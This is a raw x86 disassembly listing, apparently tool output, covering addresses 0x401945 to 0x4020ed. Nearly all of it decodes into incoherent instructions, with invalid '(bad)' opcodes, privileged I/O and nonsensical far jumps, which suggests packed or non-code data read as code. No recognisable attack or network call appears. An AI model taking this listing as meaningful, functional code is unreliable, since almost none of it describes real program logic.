  401945:	enter  0xd2db,0x53
  401949:	bound  edi,QWORD PTR [ecx+edx*1-0x2d]
  40194d:	inc    ebx
  40194e:	adc    ebp,DWORD PTR [ebx-0x6]
  401951:	inc    ebx
  401952:	adc    al,0xf
  401954:	lahf   
  401955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401956:	and    eax,0x3349be2a
  40195b:	dec    edx
  40195c:	dec    ecx
  40195d:	iret   
  40195e:	fs dec edi
  401960:	outs   dx,DWORD PTR ds:[esi]
  401961:	or     al,0xfc
  401963:	dec    ebp
  401964:	fsubr  QWORD PTR [ebp-0x3eefdc8d]
  40196a:	jae    0x40191a
  40196c:	clc    
  40196d:	pop    ss
  40196e:	sub    ebx,edi
  401970:	idiv   BYTE PTR ds:0x40c92ee9
  401976:	jmp    0xbba5:0x706ef060
  40197d:	mov    cl,dl
  40197f:	mov    dh,0xb8
  401981:	ins    BYTE PTR es:[edi],dx
  401982:	mov    eax,0xe8b76da
  401987:	sub    DWORD PTR [esi],ebx
  401989:	inc    ecx
  40198a:	mov    ebp,0x35c87ee6
  40198f:	js     0x40192f
  401991:	sbb    al,0x1e
  401993:	xor    al,0xdb
  401995:	test   al,0xfd
  401997:	mov    DWORD PTR [esi-0x94cd1e0],ecx
  40199d:	in     eax,dx
  40199e:	call   0xdbe3:0xeb64d73c
  4019a5:	inc    ebp
  4019a6:	arpl   WORD PTR [ecx+0x41],sp
  4019a9:	sbb    edx,DWORD PTR [ebx+0x611c40d0]
  4019af:	jg     0x401947
  4019b1:	shl    esi,cl
  4019b3:	mov    BYTE PTR [esi],0xe5
  4019b6:	mov    dh,0xac
  4019b8:	push   es
  4019b9:	pop    ecx
  4019ba:	fnstcw WORD PTR [ebx+0x7f4c6071]
  4019c0:	pop    ebx
  4019c1:	xchg   ch,cl
  4019c3:	push   ebp
  4019c4:	jae    0x401a08
  4019c6:	dec    ebp
  4019c7:	idiv   DWORD PTR [edx]
  4019c9:	in     al,0xb
  4019cb:	daa    
  4019cc:	dec    esi
  4019cd:	cmp    DWORD PTR [edi+ecx*4],esi
  4019d0:	out    0x0,al
  4019d2:	xchg   ecx,eax
  4019d3:	pushf  
  4019d4:	aad    0x6c
  4019d6:	jecxz  0x401a0b
  4019d8:	fcom   QWORD PTR [ebx]
  4019da:	and    ebp,ebp
  4019dc:	add    al,0x5f
  4019de:	(bad)  
  4019df:	scas   eax,DWORD PTR es:[edi]
  4019e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019e1:	nop
  4019e2:	sbb    bp,di
  4019e5:	fdiv   QWORD PTR [edi]
  4019e7:	lock cld 
  4019e9:	je     0x4019ed
  4019eb:	icebp  
  4019ec:	and    DWORD PTR [edx],edi
  4019ee:	lods   al,BYTE PTR ds:[esi]
  4019ef:	lods   eax,DWORD PTR ds:[esi]
  4019f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019f1:	fwait
  4019f2:	(bad)  
  4019f3:	into   
  4019f4:	les    esi,FWORD PTR [esi]
  4019f6:	push   edi
  4019f7:	push   0xffffffa6
  4019f9:	push   esi
  4019fa:	mov    ah,0x9b
  4019fc:	xchg   esp,eax
  4019fd:	jecxz  0x4019e7
  4019ff:	push   ecx
  401a00:	jl     0x401a52
  401a02:	inc    ebx
  401a03:	xor    al,0xd0
  401a05:	mov    dl,0x4f
  401a07:	mov    WORD PTR [edi+0x380b642c],gs
  401a0d:	repz pop ebx
  401a0f:	adc    al,dl
  401a11:	(bad)  
  401a12:	(bad)  
  401a13:	xor    eax,0x3fd8e79
  401a18:	fsubr  QWORD PTR [edx+0x10801231]
  401a1e:	jg     0x401a50
  401a20:	mov    ecx,0x82a09fc0
  401a25:	(bad)  
  401a26:	popa   
  401a27:	mov    ebx,0xff362599
  401a2c:	xor    eax,0x58aec72f
  401a31:	xchg   edx,eax
  401a32:	sti    
  401a33:	ror    BYTE PTR [ecx-0x2f5b4ca6],0x68
  401a3a:	push   cs
  401a3b:	(bad)  
  401a3c:	arpl   WORD PTR [eax-0x7b],ax
  401a3f:	add    DWORD PTR [ecx+0x1f],esi
  401a42:	jnp    0x4019c4
  401a44:	aaa    
  401a45:	mov    al,0x49
  401a47:	add    DWORD PTR [eax],ebp
  401a49:	jecxz  0x401a21
  401a4b:	cs (bad) 
  401a4d:	jp     0x401a30
  401a4f:	jbe    0x401ac2
  401a51:	in     al,0x36
  401a53:	and    bl,BYTE PTR [edx]
  401a55:	in     eax,dx
  401a56:	cld    
  401a57:	nop
  401a58:	adc    eax,0x8a13df45
  401a5d:	scas   eax,DWORD PTR es:[edi]
  401a5e:	and    dh,BYTE PTR cs:[edx-0x162e282c]
  401a65:	jno    0x401a5d
  401a67:	or     al,0x87
  401a69:	sti    
  401a6a:	pop    edx
  401a6b:	dec    eax
  401a6c:	pop    eax
  401a6d:	lahf   
  401a6e:	mov    edx,0x76eb2f0b
  401a73:	adc    al,0x11
  401a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a76:	loopne 0x401aeb
  401a78:	push   ebx
  401a79:	sbb    al,BYTE PTR [ecx+eax*8]
  401a7c:	or     eax,0x88ba2378
  401a81:	jns    0x401ac1
  401a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a84:	cli    
  401a85:	add    DWORD PTR [ebp+0xa],0xffffffb8
  401a89:	bound  ebx,QWORD PTR [ebp+0x19641559]
  401a8f:	sub    BYTE PTR [edx+edi*8-0x1a0be3f0],bl
  401a96:	pop    edi
  401a97:	pop    ss
  401a98:	aaa    
  401a99:	fsub   QWORD PTR [edx+0x6]
  401a9c:	xchg   esp,eax
  401a9d:	cmp    esi,DWORD PTR [ebp-0x17]
  401aa0:	out    0x4c,al
  401aa2:	sub    DWORD PTR [ecx+0x5c8829d9],eax
  401aa8:	jmp    0xe903:0x1af18220
  401aaf:	jae    0x401ab9
  401ab1:	pop    ebp
  401ab2:	aaa    
  401ab3:	js     0x401a48
  401ab5:	ror    BYTE PTR [ebp+0x46],cl
  401ab8:	stc    
  401ab9:	mov    ds:0xe5f561c2,eax
  401abe:	dec    edi
  401abf:	aaa    
  401ac0:	push   edx
  401ac1:	hlt    
  401ac2:	stos   DWORD PTR es:[edi],eax
  401ac3:	mov    ds:0x1951b2f4,eax
  401ac8:	rcl    BYTE PTR [eax-0x1c04627d],0x8e
  401acf:	or     eax,0x3ab759ca
  401ad4:	lods   eax,DWORD PTR gs:[esi]
  401ad6:	mov    WORD PTR [ebx-0x5d513e85],ss
  401adc:	call   0x384d:0x7d49521f
  401ae3:	adc    DWORD PTR [eax+0x72],esp
  401ae6:	pop    eax
  401ae7:	repnz or al,0xa4
  401aea:	mov    eax,ds:0x1e5682e5
  401aef:	leave  
  401af0:	leave  
  401af1:	gs std 
  401af3:	aaa    
  401af4:	jl     0x401a92
  401af6:	push   ebp
  401af7:	mov    ebp,0xc6d48de2
  401afc:	inc    edx
  401afd:	rol    bh,0x1b
  401b00:	xchg   esi,eax
  401b01:	jae    0x401aba
  401b03:	mov    BYTE PTR [edi-0x58d90058],al
  401b09:	cmc    
  401b0a:	xchg   edi,eax
  401b0b:	scas   al,BYTE PTR es:[edi]
  401b0c:	(bad)  
  401b0e:	lods   eax,DWORD PTR ds:[esi]
  401b0f:	sbb    edi,edi
  401b11:	ret    
  401b12:	xchg   esp,eax
  401b13:	cwd    
  401b15:	or     DWORD PTR [esi-0x6c],0xd97424e6
  401b1c:	popf   
  401b1d:	(bad)  
  401b1e:	mov    ds:0xd86fc7c9,al
  401b23:	jmp    0xabe1:0xb245e509
  401b2a:	cmc    
  401b2b:	xchg   DWORD PTR [ebp+0x74fa235b],edx
  401b31:	ja     0x401b12
  401b33:	imul   ecx,DWORD PTR [edi-0x594735fb],0xffffffa7
  401b3a:	stc    
  401b3b:	faddp  st(2),st
  401b3d:	rcl    DWORD PTR [ecx+0x317b4b9e],1
  401b43:	nop
  401b44:	loope  0x401aef
  401b46:	or     DWORD PTR [edi+0x6],ebx
  401b49:	hlt    
  401b4a:	shl    BYTE PTR [si-0x46],0xc5
  401b4f:	push   ebx
  401b50:	cmp    BYTE PTR [ebx],al
  401b52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b53:	pushf  
  401b54:	in     eax,0xff
  401b56:	ret    
  401b57:	jl     0x401bcf
  401b59:	push   0xffffffb4
  401b5b:	xlat   BYTE PTR ds:[ebx]
  401b5c:	fcom   DWORD PTR [ecx+0x40]
  401b5f:	push   ss
  401b60:	jge    0x401b6d
  401b62:	dec    ebp
  401b63:	push   ebx
  401b64:	outs   dx,DWORD PTR ds:[esi]
  401b65:	lahf   
  401b66:	scas   eax,DWORD PTR es:[edi]
  401b67:	mov    eax,0x9f60891
  401b6c:	mov    ebp,0x9d2ab2b9
  401b71:	jnp    0x401b1f
  401b73:	out    0x28,eax
  401b75:	sahf   
  401b76:	test   DWORD PTR ds:0xdb99efea,edi
  401b7c:	and    eax,0xf5c6cba5
  401b81:	xchg   edx,eax
  401b82:	dec    esp
  401b83:	mov    dl,0x37
  401b85:	ss stc 
  401b87:	mov    dl,0xfc
  401b89:	xchg   edx,eax
  401b8a:	rcr    BYTE PTR [eax+0x531c5dc8],1
  401b90:	rol    BYTE PTR [ebx-0x5f148710],1
  401b96:	(bad)  
  401b97:	arpl   bp,ax
  401b99:	inc    ebx
  401b9a:	inc    esp
  401b9b:	sub    bh,bl
  401b9d:	xor    ebp,0x2d
  401ba0:	jp     0x401bee
  401ba2:	mov    edx,0x53dae1d4
  401ba7:	dec    esi
  401ba8:	not    BYTE PTR [ecx+eax*2+0x10]
  401bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bad:	test   ax,0xd010
  401bb1:	ficomp WORD PTR [eax]
  401bb3:	sar    BYTE PTR [ebx+0x28d4fd],0xc4
  401bba:	repz dec ecx
  401bbc:	stc    
  401bbd:	je     0x401b43
  401bbf:	jns    0x401bfe
  401bc1:	push   0x603c7050
  401bc6:	inc    BYTE PTR [edi]
  401bc8:	jecxz  0x401bc8
  401bca:	cmp    al,0xbd
  401bcc:	sahf   
  401bcd:	xchg   BYTE PTR [esi-0x3169a9e0],bl
  401bd3:	mov    bh,0x27
  401bd5:	fimul  WORD PTR [ebp-0x4c]
  401bd8:	xchg   esp,eax
  401bd9:	stc    
  401bda:	rol    bl,cl
  401bdc:	aas    
  401bdd:	mov    BYTE PTR [edx],al
  401bdf:	sub    DWORD PTR [eax-0x4a],ebx
  401be2:	xor    BYTE PTR [ecx],ah
  401be4:	xchg   ebx,eax
  401be5:	mov    bl,0x85
  401be7:	ret    
  401be8:	sti    
  401be9:	xor    eax,0x57e0d2ac
  401bee:	(bad)  
  401bef:	or     al,0xcc
  401bf1:	mov    esi,edx
  401bf3:	mov    al,ds:0x3b787570
  401bf8:	loop   0x401b8e
  401bfa:	addr16 add dl,ah
  401bfd:	bound  ebp,QWORD PTR [ecx]
  401bff:	loop   0x401c12
  401c01:	mov    BYTE PTR [eax+0x57115742],dl
  401c07:	icebp  
  401c08:	sbb    DWORD PTR [ebx-0x26aebe9e],0xffffffc4
  401c0f:	leave  
  401c10:	retf   0x68da
  401c13:	pop    esi
  401c14:	rcr    DWORD PTR [edi+0x71],0x71
  401c18:	xor    dl,BYTE PTR [eax+edx*8]
  401c1b:	test   esp,esp
  401c1d:	aaa    
  401c1e:	pop    ecx
  401c1f:	fcmovb st,st(4)
  401c21:	mov    ds:0x66bace33,eax
  401c26:	(bad)  
  401c27:	int    0xff
  401c29:	sub    edx,ecx
  401c2b:	add    DWORD PTR [eax],edx
  401c2d:	jmp    0x401f33
  401c32:	call   0xbda4cdad
  401c37:	addr16 cmc 
  401c39:	jb     0x401c6b
  401c3b:	popa   
  401c3c:	xchg   ecx,eax
  401c3d:	and    eax,0x6737954
  401c42:	mov    cl,0x4
  401c44:	jl     0x401cc2
  401c46:	addr16 jle 0x401cc5
  401c49:	jl     0x401c43
  401c4b:	stos   BYTE PTR es:[edi],al
  401c4c:	dec    edx
  401c4d:	int3   
  401c4e:	fmul   st,st(1)
  401c50:	outs   dx,DWORD PTR ds:[esi]
  401c51:	mov    al,0x8e
  401c53:	fld    DWORD PTR [ecx]
  401c55:	ds inc esp
  401c57:	adc    al,0xae
  401c59:	jge    0x401cbe
  401c5b:	mov    edi,0x7ba15462
  401c60:	xor    eax,ecx
  401c62:	lds    ebp,FWORD PTR [bx+si-0x265a]
  401c67:	ins    BYTE PTR es:[edi],dx
  401c68:	popa   
  401c69:	popa   
  401c6a:	je     0x401c7b
  401c6c:	push   ss
  401c6d:	xor    BYTE PTR [esi-0x68],cl
  401c70:	sbb    eax,0xe0b1a321
  401c75:	push   es
  401c76:	sbb    eax,0x644580fa
  401c7b:	test   DWORD PTR [eax-0x76],ebp
  401c7e:	out    dx,eax
  401c7f:	clc    
  401c80:	pop    ecx
  401c81:	jae    0x401cf7
  401c83:	pop    edi
  401c84:	inc    esp
  401c85:	mov    edx,0xfbe793d8
  401c8a:	mov    ch,0x3f
  401c8c:	and    DWORD PTR [eax+0x74],ecx
  401c8f:	ret    0xee21
  401c92:	xor    DWORD PTR gs:[esi],esi
  401c95:	jbe    0x401c4f
  401c97:	test   eax,0xce5fd196
  401c9c:	inc    ecx
  401c9d:	sbb    dl,BYTE PTR [ecx]
  401c9f:	mov    esp,0x74975cf3
  401ca4:	lods   eax,DWORD PTR ds:[esi]
  401ca5:	mov    edx,0xb3a52b5e
  401caa:	jl     0x401cfc
  401cac:	xchg   sp,ax
  401cae:	mov    DWORD PTR [edi+edi*2],edx
  401cb1:	arpl   WORD PTR [ecx+ecx*1-0x55],bp
  401cb5:	adc    dl,BYTE PTR [ebx]
  401cb7:	or     bh,BYTE PTR ds:[eiz*1-0x2d669d5a]
  401cbf:	mov    dl,0x9
  401cc1:	sbb    al,0x55
  401cc3:	xchg   DWORD PTR [edi-0x63],eax
  401cc6:	push   0x2f
  401cc8:	fisttp WORD PTR [eax]
  401cca:	push   edi
  401ccb:	(bad)  
  401ccc:	push   esp
  401ccd:	ret    0x572e
  401cd0:	xlat   BYTE PTR ds:[ebx]
  401cd1:	push   edi
  401cd2:	and    al,0xd9
  401cd4:	sbb    al,0x68
  401cd6:	and    cl,BYTE PTR ds:0xbe1b842d
  401cdc:	pusha  
  401cdd:	push   cs
  401cde:	cmp    BYTE PTR [ecx-0x3a],dh
  401ce1:	repnz mov bl,0xa3
  401ce4:	imul   ebp,DWORD PTR [edx-0x14d1f5e],0xffffffd7
  401ceb:	sub    eax,DWORD PTR [ebx+ebx*4-0x69]
  401cef:	xchg   ecx,eax
  401cf0:	(bad)  
  401cf1:	cwde   
  401cf2:	pop    ecx
  401cf3:	xchg   esp,eax
  401cf4:	mov    edx,0x950c192e
  401cf9:	sub    eax,0x1a4cf20f
  401cfe:	pusha  
  401cff:	jo     0x401cff
  401d01:	(bad)  
  401d03:	test   eax,0x39ea5d9d
  401d08:	adc    DWORD PTR [edx+0x3d],ebx
  401d0b:	add    eax,0x745cf9cc
  401d10:	(bad)  
  401d12:	mov    ?,WORD PTR [edi+0x3f15f571]
  401d18:	xchg   ebx,eax
  401d19:	daa    
  401d1a:	aad    0x3a
  401d1c:	mov    eax,0xffb2168
  401d21:	push   cs
  401d22:	mov    ss,WORD PTR [ebp+0x412f5ce4]
  401d28:	dec    edx
  401d29:	mov    bh,0x38
  401d2b:	fmul   st(0),st
  401d2d:	jno    0x401d87
  401d2f:	lock pushf 
  401d31:	sbb    ch,BYTE PTR ds:0x88f72e5f
  401d37:	aad    0x61
  401d39:	fiadd  WORD PTR [esi*1-0x7a28553a]
  401d40:	xchg   edi,ebp
  401d42:	xor    DWORD PTR [edi],edi
  401d44:	adc    dl,dh
  401d46:	dec    eax
  401d47:	xlat   BYTE PTR ds:[ebx]
  401d48:	xchg   ebx,eax
  401d49:	jmp    0x401da6
  401d4b:	pop    ebx
  401d4c:	je     0x401d96
  401d4e:	push   edi
  401d4f:	clc    
  401d50:	pop    ecx
  401d51:	in     al,0x28
  401d53:	xchg   esp,eax
  401d54:	inc    esp
  401d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d56:	add    cl,BYTE PTR [esi+0x5d79b97e]
  401d5c:	inc    ecx
  401d5d:	and    DWORD PTR [edx+0x3b587cc6],edi
  401d63:	(bad)  
  401d65:	cbw    
  401d67:	enter  0x6404,0xd2
  401d6b:	sub    al,0xa3
  401d6d:	imul   esi,DWORD PTR ds:0x20b318b4,0x13e3e327
  401d77:	rcr    BYTE PTR [esi+eax*1+0x77],0xa9
  401d7c:	ds cld 
  401d7e:	push   ecx
  401d7f:	push   ebx
  401d80:	(bad)  
  401d82:	loope  0x401d4c
  401d84:	sub    DWORD PTR [edi],ebx
  401d86:	dec    ecx
  401d87:	test   DWORD PTR [ebx-0x36156619],edx
  401d8d:	dec    eax
  401d8e:	lods   eax,DWORD PTR ds:[esi]
  401d8f:	xchg   edi,eax
  401d90:	or     edx,edi
  401d92:	jg     0x401d3e
  401d94:	ret    
  401d95:	sbb    dh,ah
  401d97:	xor    BYTE PTR [edi-0x26],cl
  401d9a:	int    0xa4
  401d9c:	mov    al,0xe8
  401d9e:	jbe    0x401dc8
  401da0:	retf   0xd45a
  401da3:	inc    ebp
  401da4:	ror    BYTE PTR [eax+0x1a],cl
  401da7:	jb     0x401d60
  401da9:	jb     0x401deb
  401dab:	mov    ds:0x1a3e0519,eax
  401db0:	jne    0x401d6b
  401db2:	mul    BYTE PTR [esi]
  401db4:	mov    eax,0x8e62e0ae
  401db9:	inc    esi
  401dba:	fist   WORD PTR [eax+0x5f2f8224]
  401dc0:	repz add edx,DWORD PTR [ebx]
  401dc3:	stos   BYTE PTR es:[edi],al
  401dc4:	call   0xda823980
  401dc9:	sahf   
  401dca:	aad    0x84
  401dcc:	or     eax,0x4c2d6447
  401dd1:	mov    ebp,fs
  401dd3:	out    0x6b,eax
  401dd5:	les    ebx,FWORD PTR [eax-0x64d3cfa7]
  401ddb:	sar    BYTE PTR [ecx],1
  401ddd:	stos   DWORD PTR es:[edi],eax
  401dde:	div    BYTE PTR [ebp+esi*8+0x2f]
  401de2:	fsubr  st(2),st
  401de4:	(bad)  
  401de5:	dec    ebx
  401de6:	dec    edx
  401de7:	cmp    al,0x2f
  401de9:	xlat   BYTE PTR ds:[ebx]
  401dea:	sub    esp,esp
  401dec:	mov    dh,0xc2
  401dee:	push   ebp
  401def:	cmp    ebx,DWORD PTR [edi]
  401df1:	dec    ebp
  401df2:	xor    eax,0xe09b5eb
  401df7:	jg     0x401e09
  401df9:	repz jg 0x401e59
  401dfc:	xor    BYTE PTR [edi],al
  401dfe:	jge    0x401e3e
  401e00:	outs   dx,DWORD PTR ds:[esi]
  401e01:	lea    ecx,[edx]
  401e03:	dec    edx
  401e04:	inc    esp
  401e05:	fisub  DWORD PTR [ebx]
  401e07:	aad    0x86
  401e09:	sub    BYTE PTR [edx-0x2e],dh
  401e0c:	aad    0x55
  401e0e:	mov    edi,0x4f64c459
  401e13:	xlat   BYTE PTR ds:[ebx]
  401e14:	cmp    al,0xec
  401e16:	sbb    DWORD PTR [ebx],0x4c
  401e19:	shl    BYTE PTR [edi+0x46],0x7d
  401e1d:	adc    bl,BYTE PTR [esp+edx*2]
  401e20:	jmp    0x7089c8c9
  401e25:	cdq    
  401e26:	pop    eax
  401e27:	adc    ch,bl
  401e29:	ins    DWORD PTR es:[edi],dx
  401e2a:	aam    0xaf
  401e2c:	lahf   
  401e2d:	mov    cl,0x51
  401e2f:	jg     0x401dcd
  401e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e32:	sub    ch,BYTE PTR [edi+0x45cb17fd]
  401e38:	ret    0x3497
  401e3b:	push   ebp
  401e3c:	fcom   QWORD PTR [edx+0x77]
  401e3f:	cmc    
  401e40:	dec    ebp
  401e41:	mov    ebp,0x92a58614
  401e46:	xchg   ebp,eax
  401e47:	sbb    eax,0xa8fdd523
  401e4c:	sbb    eax,0x9806fb03
  401e51:	cmp    BYTE PTR [ebx+0x66],ah
  401e54:	jg     0x401e18
  401e56:	les    edi,FWORD PTR [edi]
  401e58:	mov    dl,0x3f
  401e5a:	or     BYTE PTR [eax-0x3b],0x93
  401e5e:	push   eax
  401e5f:	mov    eax,0x4466c4a6
  401e64:	lds    ebx,FWORD PTR [ebp+edx*8+0x55]
  401e68:	pop    esi
  401e69:	sub    ch,bh
  401e6b:	mov    cl,0x1b
  401e6d:	popf   
  401e6e:	sbb    bl,BYTE PTR [eax-0x7]
  401e71:	mov    edi,0x941a90b3
  401e76:	push   ebx
  401e77:	bnd jmp 0x401e3b
  401e7a:	rcr    DWORD PTR [ebp-0x51],0x59
  401e7e:	iret   
  401e7f:	sahf   
  401e80:	mov    bl,BYTE PTR [ebx-0x42]
  401e83:	push   edi
  401e84:	or     al,ah
  401e86:	sub    DWORD PTR [edi],ebx
  401e88:	pop    esp
  401e89:	cmp    esp,DWORD PTR [ebp+0x5be513e7]
  401e8f:	imul   ebx,DWORD PTR [edi],0x15
  401e92:	mov    eax,0x21b07e9b
  401e97:	lods   al,BYTE PTR ds:[esi]
  401e98:	popf   
  401e99:	add    DWORD PTR [eax+0x17],ecx
  401e9c:	xchg   esi,eax
  401e9d:	mov    esp,0x510d6b7d
  401ea2:	fstp   QWORD PTR [ecx]
  401ea4:	test   bh,ch
  401ea6:	aas    
  401ea7:	cli    
  401ea8:	popa   
  401ea9:	cmp    al,0xdc
  401eab:	addr16 mov eax,ds:0x9f47
  401eaf:	out    dx,eax
  401eb0:	and    esp,DWORD PTR [esi-0x1a13234a]
  401eb6:	adc    bl,ch
  401eb8:	cmp    DWORD PTR [ebx-0x16],0x5
  401ebc:	pushf  
  401ebd:	adc    esi,edx
  401ebf:	adc    al,0xe6
  401ec1:	mov    edx,0xee9ba6e1
  401ec6:	push   edx
  401ec7:	out    dx,al
  401ec8:	data16 in al,dx
  401eca:	xor    bl,BYTE PTR [ebx]
  401ecc:	pop    esi
  401ecd:	arpl   WORD PTR [eax+0x41],si
  401ed0:	in     al,dx
  401ed1:	loope  0x401e76
  401ed3:	mov    BYTE PTR [edx+0x195d3af4],bh
  401ed9:	call   0x3065f009
  401ede:	xchg   ebx,eax
  401edf:	pop    ebp
  401ee0:	into   
  401ee1:	lahf   
  401ee2:	addr16 aaa 
  401ee4:	sti    
  401ee5:	call   0x3bad:0xb8328d98
  401eec:	ror    BYTE PTR [ecx+0x56],0xb6
  401ef0:	jo     0x401eab
  401ef2:	and    al,0xf0
  401ef4:	outs   dx,DWORD PTR ds:[esi]
  401ef5:	jmp    0xfdb60e84
  401efa:	mov    ?,esp
  401efc:	xor    DWORD PTR [ebx+0x3bf53676],ecx
  401f02:	dec    ebp
  401f03:	(bad)  
  401f05:	icebp  
  401f06:	or     edi,DWORD PTR [esi+0x4faae2ac]
  401f0c:	xchg   ebx,esi
  401f0e:	xchg   ebp,eax
  401f0f:	mov    eax,0x9ac3030
  401f14:	or     DWORD PTR [edx],0xffffffa3
  401f17:	xor    al,0xa5
  401f19:	or     esi,ebp
  401f1b:	call   0xc23d53e
  401f20:	loope  0x401f82
  401f22:	clc    
  401f23:	loope  0x401eb6
  401f25:	dec    ecx
  401f26:	push   ecx
  401f27:	hlt    
  401f28:	xchg   esp,eax
  401f29:	test   DWORD PTR [ecx],0x653dd494
  401f2f:	fld    DWORD PTR [ecx-0x71]
  401f32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f33:	mov    eax,ds:0x413bea
  401f38:	mov    eax,DWORD PTR [eax]
  401f3a:	mov    cx,WORD PTR [ebp-0x4]
  401f3e:	movzx  ecx,cx
  401f41:	add    ecx,DWORD PTR [eax]
  401f43:	mov    DWORD PTR [ebp-0x18],ecx
  401f46:	mov    eax,DWORD PTR [ebp+0xc]
  401f49:	jmp    0x40224f
  401f4e:	adc    BYTE PTR [ebx+0x52c9c8c9],0x8d
  401f55:	pop    ebp
  401f56:	and    DWORD PTR [ebp-0x67],0xb5aed250
  401f5d:	xor    al,0x98
  401f5f:	add    DWORD PTR [esp+edi*2+0x67],edi
  401f63:	jle    0x401fe1
  401f65:	jl     0x401fab
  401f67:	push   edx
  401f68:	jp     0x401fcf
  401f6a:	sbb    al,0xbe
  401f6c:	ins    DWORD PTR es:[edi],dx
  401f6d:	mov    ebx,0xca666d65
  401f72:	sub    bl,BYTE PTR [eax]
  401f74:	jae    0x401f3d
  401f76:	jp     0x401f68
  401f78:	push   es
  401f79:	push   ebx
  401f7a:	ss call 0xd437:0xd71ca57e
  401f82:	push   ds
  401f83:	pop    edi
  401f84:	ror    BYTE PTR [esi+0x21e8a699],cl
  401f8a:	cmp    al,0x9b
  401f8c:	pushf  
  401f8d:	jo     0x401f92
  401f8f:	mov    BYTE PTR [eax+0x4e1d188],ch
  401f95:	mov    ch,0x33
  401f97:	lods   al,BYTE PTR ds:[esi]
  401f98:	ret    0xeb96
  401f9b:	xor    ah,BYTE PTR [ebx]
  401f9d:	push   ebx
  401f9e:	cdq    
  401f9f:	mov    ecx,0x7ceb7892
  401fa4:	mov    eax,0xe524cf86
  401fa9:	mov    al,bl
  401fab:	add    cl,BYTE PTR [eax+0x6597e530]
  401fb1:	test   eax,0xbc1ef0e
  401fb6:	add    BYTE PTR [ecx],dh
  401fb8:	adc    eax,0xe884709
  401fbd:	mov    bh,0xe8
  401fbf:	jecxz  0x40200b
  401fc1:	xchg   DWORD PTR [ebp-0x5917fb2f],esp
  401fc7:	in     al,0x52
  401fc9:	stc    
  401fca:	iret   
  401fcb:	or     eax,0x3a1f8cfe
  401fd0:	adc    cl,BYTE PTR [eax]
  401fd2:	sub    DWORD PTR [edx-0x6d],ebx
  401fd5:	int    0x23
  401fd7:	loop   0x40200d
  401fd9:	jne    0x401f8c
  401fdb:	test   BYTE PTR [edi+0x5a],dh
  401fde:	aam    0xc3
  401fe0:	xchg   esp,eax
  401fe1:	aad    0xcd
  401fe3:	shl    BYTE PTR [ecx],1
  401fe5:	mov    ecx,DWORD PTR [ecx+eax*2+0x25]
  401fe9:	push   esi
  401fea:	in     al,dx
  401feb:	and    dh,BYTE PTR [edx+0x7af5107c]
  401ff1:	mov    DWORD PTR [ebx-0x24],0xdc18f898
  401ff8:	imul   edi,DWORD PTR [bx+di-0x3525],0xffffffa1
  401ffe:	dec    ecx
  401fff:	rcl    DWORD PTR [ebx+edi*1-0x26],0x5
  402004:	mov    eax,0xe35a5391
  402009:	push   edi
  40200a:	add    edx,DWORD PTR [ebx-0x1f]
  40200d:	push   ebx
  40200e:	cmp    esi,DWORD PTR [ebp+eiz*8-0x7a]
  402012:	jns    0x40207f
  402014:	pop    esi
  402015:	call   0xddb2:0x9468d0d7
  40201c:	pop    edi
  40201d:	xchg   di,ax
  40201f:	(bad)  
  402020:	in     eax,dx
  402021:	lahf   
  402022:	retf   0xe2c8
  402025:	js     0x40208a
  402027:	call   0x3000d977
  40202c:	jmp    0xc8599517
  402031:	jbe    0x402017
  402033:	adc    BYTE PTR [ebp-0x3a40309c],ch
  402039:	mov    dl,0x11
  40203b:	inc    edi
  40203c:	xlat   BYTE PTR ds:[ebx]
  40203d:	pop    es
  40203e:	in     eax,0x53
  402040:	and    dh,BYTE PTR [edi-0x52]
  402043:	dec    ecx
  402044:	mov    ds:0xcfb98fd4,eax
  402049:	imul   BYTE PTR [ebx+0x5b363812]
  40204f:	mov    WORD PTR [ebx],?
  402051:	fsubr  st,st(0)
  402053:	ficom  DWORD PTR [ecx]
  402055:	mov    BYTE PTR [edx],ch
  402057:	xor    eax,ecx
  402059:	xchg   ebp,eax
  40205a:	in     eax,0x86
  40205c:	mov    esi,DWORD PTR [eax+0x16]
  40205f:	mov    esp,0x7b69b0e8
  402064:	push   0x32
  402066:	outs   dx,DWORD PTR ds:[esi]
  402067:	pop    ebp
  402068:	jg     0x4020ae
  40206a:	call   0xffc9:0x4613a783
  402071:	inc    ecx
  402072:	js     0x4020ae
  402074:	jecxz  0x4020cb
  402076:	push   ebp
  402077:	or     DWORD PTR [ecx],ebp
  402079:	rol    BYTE PTR [ebx],0x76
  40207c:	mov    al,ds:0x21c2593f
  402081:	(bad)  
  402082:	pushf  
  402083:	mov    esp,eax
  402085:	sub    ch,al
  402087:	ds push ecx
  402089:	arpl   WORD PTR ds:0xabba9ed6,bx
  40208f:	setae  BYTE PTR [ebx+edi*4+0x42eba9fa]
  402097:	cmp    eax,0x56d6a2a2
  40209c:	inc    esp
  40209d:	dec    edx
  40209e:	loope  0x4020dd
  4020a0:	ror    DWORD PTR [edi-0xb886ae2],cl
  4020a6:	xchg   esi,eax
  4020a7:	xchg   ecx,eax
  4020a8:	out    0x5a,eax
  4020aa:	retf   
  4020ab:	jp     0x40211d
  4020ad:	sbb    dl,BYTE PTR [edx]
  4020af:	out    dx,al
  4020b0:	push   ebx
  4020b1:	add    eax,0x92bbc52f
  4020b6:	sar    eax,1
  4020b8:	dec    edx
  4020b9:	sar    DWORD PTR ds:0xbc22ff02,1
  4020bf:	aas    
  4020c0:	mov    bl,0x30
  4020c2:	inc    esi
  4020c3:	daa    
  4020c4:	lock jae 0x4020c0
  4020c7:	fadd   QWORD PTR [ecx+ebx*8+0xec25d96]
  4020ce:	and    ah,BYTE PTR [edx+0x21]
  4020d1:	jmp    0x3dba:0xe4577944
  4020d8:	inc    eax
  4020d9:	mov    dh,0x3c
  4020db:	aad    0xee
  4020dd:	mov    ds:0xd24d7247,eax
  4020e2:	(bad)  
  4020e3:	mov    dl,0x2b
  4020e5:	jl     0x4020ee
  4020e7:	in     al,0x66
  4020e9:	aam    0xf0
  4020eb:	jle    0x402161
  4020ed:	sub    BYTE PTR [ebx],bh
